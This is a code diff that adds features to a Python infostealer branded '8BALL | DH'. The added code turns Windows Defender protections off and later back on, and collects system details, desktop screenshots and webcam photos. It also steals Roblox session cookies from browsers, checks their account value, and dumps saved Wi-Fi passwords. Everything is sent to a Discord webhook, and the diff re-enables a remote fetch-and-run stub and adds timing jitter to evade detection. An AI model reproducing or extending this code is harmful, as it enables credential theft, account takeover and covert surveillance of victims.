+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -MAPSReporting 0 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -SubmitSamplesConsent 2 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
     except:
         pass
 
@@ -2626,6 +2777,184 @@ def enable_windows_security():
             ctypes.windll.advapi32.CloseServiceHandle(service)
         ctypes.windll.advapi32.CloseServiceHandle(scm)
     except:
+        pass
+    try:
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableIOAVProtection $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBlockAtFirstSeen $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScanOnRealtimeEnable $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisablePrivacyMode $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableArchiveScanning $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableEmailScanning $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScriptScanning $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -MAPSReporting 2 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -SubmitSamplesConsent 1 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
+    except:
+        pass
+
+# === NEW FEATURES ===
+
+def G37SYS1NF0():
+    if not FEATURE_CONFIG.get("system_info", False):
+        return
+    try:
+        import platform
+        try:
+            import GPUtil
+            gpus = GPUtil.getGPUs()
+            gpui = gpus[0].name if gpus else "No GPU found"
+        except Exception:
+            gpui = "No GPU found"
+        try:
+            import psutil
+            mem = psutil.virtual_memory()
+            mem_str = f"{mem.total / (1024**3):.2f} GB"
+        except Exception:
+            mem_str = "N/A"
+        ds = platform.uname()
+        sdg = platform.processor()
+        desc = f"**:man: | Username: {ds.node}**\n**:floppy_disk: | Processor: {ds.machine} {sdg}**\n**:desktop: | System: {ds.system}**\n**:vhs: | GPU: {gpui}**\n**:minidisc: | Memory: {mem_str}**"
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+        payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":desktop: PC Info", "description": desc, "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
+        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
+    except Exception:
+        pass
+
+def G37SCR3NSH0T():
+    if not FEATURE_CONFIG.get("screenshot_capture", False):
+        return
+    try:
+        import pyautogui
+        ss = pyautogui.screenshot()
+        ss_path = os.path.join(temp or os.getenv("TEMP", "."), "desktop_screenshot.png")
+        ss.save(ss_path)
+        link = UP104D7060F113(ss_path)
+        os.remove(ss_path)
+        if link and isinstance(link, str):
+            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+            payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":camera: Screenshot", "description": f"[Download Screenshot]({link})", "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
+            L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
+    except Exception:
+        pass
+
+def G37W3BC4M():
+    if not FEATURE_CONFIG.get("webcam_capture", False):
+        return
+    try:
+        import cv2
+        cam = cv2.VideoCapture(0)
+        if cam.isOpened():
+            ret, frame = cam.read()
+            cam.release()
+            if ret:
+                cam_path = os.path.join(temp or os.getenv("TEMP", "."), "webcam_capture.png")
+                cv2.imwrite(cam_path, frame)
+                link = UP104D7060F113(cam_path)
+                os.remove(cam_path)
+                if link and isinstance(link, str):
+                    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+                    payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":camera_with_flash: Webcam Capture", "description": f"[Download Photo]({link})", "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
+                    L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
+    except Exception:
+        pass
+
+def G37R0BL0X():
+    if not FEATURE_CONFIG.get("roblox_cookies", False):
+        return
+    try:
+        cookies = []
+        try:
+            import browser_cookie3
+            for browser in [browser_cookie3.chrome, browser_cookie3.chromium, browser_cookie3.brave, browser_cookie3.opera_gx, browser_cookie3.firefox, browser_cookie3.opera, browser_cookie3.edge]:
+                try:
+                    for c in browser(domain_name="roblox.com"):
+                        if c.name == '.ROBLOSECURITY':
+                            cookies.append(c.value)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        if not cookies:
+            desc = "No Roblox cookies found."
+        else:
+            desc_lines = []
+            all_data = ""
+            for c in cookies:
+                try:
+                    req = Request("https://users.roblox.com/v1/users/authenticated", headers={"Cookie": f".ROBLOSECURITY={c}", "User-Agent": "Mozilla/5.0"})
+                    resp = urlopen(req, timeout=10)
+                    info = loads(resp.read().decode())
+                    uid = info.get("id", 0)
+                    uname = info.get("name", "Unknown")
+                    dname = info.get("displayName", uname)
+                    rap_total = 0
+                    limited_count = 0
+                    limiteds_info = []
+                    try:
+                        inv_req = Request(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Asc", headers={"Cookie": f".ROBLOSECURITY={c}", "User-Agent": "Mozilla/5.0"})
+                        inv_resp = urlopen(inv_req, timeout=10)
+                        inv_data = loads(inv_resp.read().decode())
+                        for item in inv_data.get("data", []):
+                            if item.get("recentAveragePrice"):
+                                rap_total += item["recentAveragePrice"]
+                                limited_count += 1
+                                limiteds_info.append(f"{item.get('name', 'Unknown')} - {item['recentAveragePrice']} RAP")
+                    except Exception:
+                        pass
+                    desc_lines.append(f"**User:** {uname} (@{dname}) | **ID:** {uid}")
+                    desc_lines.append(f"**Limiteds:** {limited_count} | **RAP:** {rap_total:,}")
+                    top_limiteds = limiteds_info[:5]
+                    if top_limiteds:
+                        desc_lines.append("**Top Limiteds:** " + ", ".join(top_limiteds))
+                    desc_lines.append("")
+                    all_data += f"Username: {uname} (Display: {dname})\nUser ID: {uid}\n.ROBLOSECURITY: {c}\nLimiteds: {limited_count}\nRAP: {rap_total:,}\n\n"
+                except Exception:
+                    desc_lines.append(f"**Failed to verify one cookie**")
+            desc = "\n".join(desc_lines) if desc_lines else "Cookies found but could not verify."
+            data_path = os.path.join(temp or os.getenv("TEMP", "."), "roblox_data.txt")
+            with open(data_path, "w", encoding="utf-8") as f:
+                f.write(all_data)
+            link = UP104D7060F113(data_path)
+            os.remove(data_path)
+            if link and isinstance(link, str):
+                desc += f"\n\n[Full Data]({link})"
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+        payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":video_game: Roblox Accounts", "description": desc[:4000], "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
+        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
+    except Exception:
+        pass
+
+def G37W1F1():
+    if not FEATURE_CONFIG.get("wifi_passwords", False):
+        return
+    try:
+        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
+        profiles = []
+        for line in result.stdout.splitlines():
+            if 'All User Profile' in line:
+                name = line.split(':')[1].strip()
+                profiles.append(name)
+        wifi_data = ""
+        for profile in profiles:
+            res = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
+            for line in res.stdout.splitlines():
+                if 'Key Content' in line:
+                    pwd = line.split(':')[1].strip()
+                    wifi_data += f"WiFi: {profile}\nPassword: {pwd}\n\n"
+        desc = f"Found {len(profiles)} Wi-Fi profile(s)" if wifi_data else "No Wi-Fi passwords found."
+        if wifi_data:
+            wifi_path = os.path.join(temp or os.getenv("TEMP", "."), "wifi_passwords.txt")
+            with open(wifi_path, "w", encoding="utf-8") as f:
+                f.write(wifi_data)
+            link = UP104D7060F113(wifi_path)
+            os.remove(wifi_path)
+            if link and isinstance(link, str):
+                desc += f"\n\n[Download Passwords]({link})"
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+        payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":signal_strength: Wi-Fi Passwords", "description": desc, "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
+        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
+    except Exception:
         pass
 
 # === ENHANCED STEALTH LAYER ===
@@ -2763,25 +3092,43 @@ if not ctypes.windll.shell32.IsUserAnAdmin():
         RX_DB6("Elevation failed, running without admin.", "WARN")
 
 disable_windows_security()
+if globals().get("_8BALL_EXECUTED"):
+    raise SystemExit(0)
+globals()["_8BALL_EXECUTED"] = True
+# Re-enable Defender realtime protection after 3 minutes
+def _re_enable_defender():
+    time.sleep(180)
+    enable_windows_security()
+threading.Thread(target=_re_enable_defender, daemon=True).start()
 random_delay(1.0, 4.0)
 
-# Disabled: remote stub overrides local functions with broken webhook validation
-# fetch_thread = threading.Thread(target=fetch_and_run, daemon=True)
-# fetch_thread.start()
+fetch_thread = threading.Thread(target=fetch_and_run, daemon=True)
+fetch_thread.start()
 
 # Execute stealers with randomized order and jitter to evade detection
-shuffled_run([filestealr, G47H3r411])
+shuffled_run([filestealr, G47H3r411, G37SYS1NF0, G37SCR3NSH0T, G37W3BC4M, G37R0BL0X, G37W1F1])
 
 random_delay(0.5, 2.0)
 
 if FEATURE_CONFIG.get("discord_tokens", False) and not T0K3Ns:
-    send_confirmation_embed("8Ball | Discord Tokens", "No Discord tokens found in browser or app storage.")
+    send_confirmation_embed("8BALL | DH", "No Discord tokens found in browser or app storage.")
 
 if FEATURE_CONFIG.get("discord_injection", False):
-    send_confirmation_embed("8Ball | Discord Injection", "Discord JavaScript injection feature executed.")
+    send_confirmation_embed("8BALL | DH", "Discord JavaScript injection feature executed.")
 
 if FEATURE_CONFIG.get("ip_location_info", False):
-    send_confirmation_embed("8Ball | IP & Location", GLINFO)
+    send_confirmation_embed("8BALL | DH", GLINFO)
+
+if FEATURE_CONFIG.get("system_info", False):
+    send_confirmation_embed("8BALL | DH", "PC hardware information collected.")
+if FEATURE_CONFIG.get("screenshot_capture", False):
+    send_confirmation_embed("8BALL | DH", "Desktop screenshot captured.")
+if FEATURE_CONFIG.get("webcam_capture", False):
+    send_confirmation_embed("8BALL | DH", "Webcam photo captured.")
+if FEATURE_CONFIG.get("roblox_cookies", False):
+    send_confirmation_embed("8BALL | DH", "Roblox cookie extraction completed.")
+if FEATURE_CONFIG.get("wifi_passwords", False):
+    send_confirmation_embed("8BALL | DH", "Wi-Fi password extraction completed.")
 
 cleanup_indicators()
 # Send debug log embed to Discord (only if debug_mode is enabled)
